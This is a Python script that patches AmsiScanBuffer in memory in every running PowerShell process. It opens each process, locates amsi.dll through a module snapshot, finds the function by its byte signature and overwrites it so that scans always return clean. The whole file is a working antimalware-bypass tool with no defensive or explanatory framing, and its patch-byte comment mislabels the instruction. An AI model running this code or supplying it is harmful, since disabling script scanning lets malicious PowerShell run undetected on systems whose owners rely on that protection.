import ctypes
import subprocess
import sys

# Load KERNEL32 DLL
KERNEL32 = ctypes.windll.kernel32

# Constants
PROCESS_ACCESS = (
    0x000F0000 |       
    0x00100000 |       
    0xFFFF
)
PAGE_READWRITE = 0x40

def read_buffer(handle, base_address, amsi_scan_buffer):
    # Define the argument types for ReadProcessMemory function
    KERNEL32.ReadProcessMemory.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.POINTER(ctypes.c_ulong)]
    
    while True:
        # Create a buffer to read the process memory
        lp_buffer = ctypes.create_string_buffer(b'', len(amsi_scan_buffer))
        n_bytes = ctypes.c_ulong(0)
        
        # Read the process memory
        KERNEL32.ReadProcessMemory(handle, base_address, lp_buffer, len(lp_buffer), ctypes.byref(n_bytes))
        
        # Check if the read buffer matches the desired buffer or the injected patch
        if lp_buffer.value == amsi_scan_buffer or lp_buffer.value.startswith(b'\x29\xc0\xc3'):
            return base_address
        else:
            base_address += 1

def write_buffer(handle, address, buffer):
    # Define the argument types for WriteProcessMemory and VirtualProtectEx functions
    n_bytes = ctypes.c_size_t(0)
    KERNEL32.WriteProcessMemory.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
    KERNEL32.VirtualProtectEx.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)]

    # Change the memory protection to PAGE_READWRITE
    res = KERNEL32.VirtualProtectEx(handle, address, len(buffer), PAGE_READWRITE, ctypes.byref(ctypes.c_ulong()))
    if not res:
        print(f'[-] VirtualProtectEx Error: {KERNEL32.GetLastError()}')
    
    # Write the buffer to the process memory
    res = KERNEL32.WriteProcessMemory(handle, address, buffer, len(buffer), ctypes.byref(n_bytes))
    if not res:
        print(f'[-] WriteProcessMemory Error: {KERNEL32.GetLastError()}')
    
    return res

def get_amsi_scan_buffer_address(handle, base_address):
    # AMSI scan buffer signature to search for in process memory
    amsi_scan_buffer = (
        b'\x4c\x8b\xdc' +       # mov r11,rsp
        b'\x49\x89\x5b\x08' +   # mov qword ptr [r11+8],rbx
        b'\x49\x89\x6b\x10' +   # mov qword ptr [r11+10h],rbp
        b'\x49\x89\x73\x18' +   # mov qword ptr [r11+18h],rsi
        b'\x57' +               # push rdi
        b'\x41\x56' +           # push r14
        b'\x41\x57' +           # push r15
        b'\x48\x83\xec\x70'     # sub rsp,70h
    )
    
    # Search for the AMSI scan buffer in process memory
    return read_buffer(handle, base_address, amsi_scan_buffer)

def patch_amsi_scan_buffer(handle, func_address):
    # Patch payload to replace the AMSI scan buffer function
    patch_payload = (
        b'\x29\xc0' +           # xor eax,eax
        b'\xc3'                 # ret
    )
    
    # Patch the AMSI scan buffer function in process memory
    return write_buffer(handle, func_address, patch_payload)

def get_amsi_dll_base_address(handle, pid):
    MAX_PATH = 260
    MAX_MODULE_NAME32 = 255
    TH32CS_SNAPMODULE = 0x00000008
    
    # Define the MODULEENTRY32 structure
    class MODULEENTRY32(ctypes.Structure):
        _fields_ = [
            ('dwSize', ctypes.c_ulong),
            ('th32ModuleID', ctypes.c_ulong),
            ('th32ProcessID', ctypes.c_ulong),
            ('GlblcntUsage', ctypes.c_ulong),
            ('ProccntUsage', ctypes.c_ulong),
            ('modBaseAddr', ctypes.c_void_p),  # Change made here
            ('modBaseSize', ctypes.c_ulong),
            ('hModule', ctypes.c_void_p),
            ('szModule', ctypes.c_char * (MAX_MODULE_NAME32+1)),
            ('szExePath', ctypes.c_char * MAX_PATH)
        ]
    
    me32 = MODULEENTRY32()
    me32.dwSize = ctypes.sizeof(MODULEENTRY32)
    
    # Take a snapshot of the specified process (TH32CS_SNAPMODULE)
    snapshot_handle = KERNEL32.CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid)
    
    # Get the first module from the snapshot
    ret = KERNEL32.Module32First(snapshot_handle, ctypes.byref(me32))
    
    while ret:
        # Check if the module is AMSI DLL
        if me32.szModule == b'amsi.dll':
            print(f'[+] Found base address of {me32.szModule.decode()}: {hex(me32.modBaseAddr)}')
            
            # Close the snapshot handle and return the address of AMSI scan buffer
            KERNEL32.CloseHandle(snapshot_handle)
            return get_amsi_scan_buffer_address(handle, me32.modBaseAddr)
        else:
            # Move to the next module in the snapshot
            ret = KERNEL32.Module32Next(snapshot_handle, ctypes.byref(me32))

# Get the PIDs of PowerShell processes
def get_powershell_pids():
    cmd = 'tasklist /fi "imagename eq powershell.exe" /fo csv'
    output = subprocess.check_output(cmd, shell=True).decode()
    lines = output.strip().split('\n')[1:]
    pids = [int(line.split(',')[1].strip('"')) for line in lines]
    return pids

# Get the PIDs of PowerShell processes
pids = get_powershell_pids()

# Perform actions on each PowerShell process
for pid in pids:
    # Open the process with the specified access rights
    process_handle = KERNEL32.OpenProcess(PROCESS_ACCESS, False, pid)
    if not process_handle:
        continue
    
    print(f'[+] Got process handle of PID powershell at {pid}: {hex(process_handle)}')
    print(f'[+] Trying to find AmsiScanBuffer in {pid} process memory...')
    
    # Get the base address of AMSI DLL in the process
    amsi_dll_base_address = get_amsi_dll_base_address(process_handle, pid)
    if not amsi_dll_base_address:
        print(f'[-] Error finding AmsiDllBaseAddress in {pid}.')
        print(f'[-] Error: {KERNEL32.GetLastError()}')
        sys.exit(1)
    else:
        print(f'[+] Trying to patch AmsiScanBuffer found at {hex(amsi_dll_base_address)}')
        
        # Patch the AMSI scan buffer in the process
        if not patch_amsi_scan_buffer(process_handle, amsi_dll_base_address):
            print(f'[-] Error patching AmsiScanBuffer in {pid}.')
            print(f'[-] Error: {KERNEL32.GetLastError()}')
            sys.exit(1)
        else:
            print(f'[+] Success patching AmsiScanBuffer in PID {pid}')
    
    # Close the process handle
    KERNEL32.CloseHandle(process_handle)
    print('')
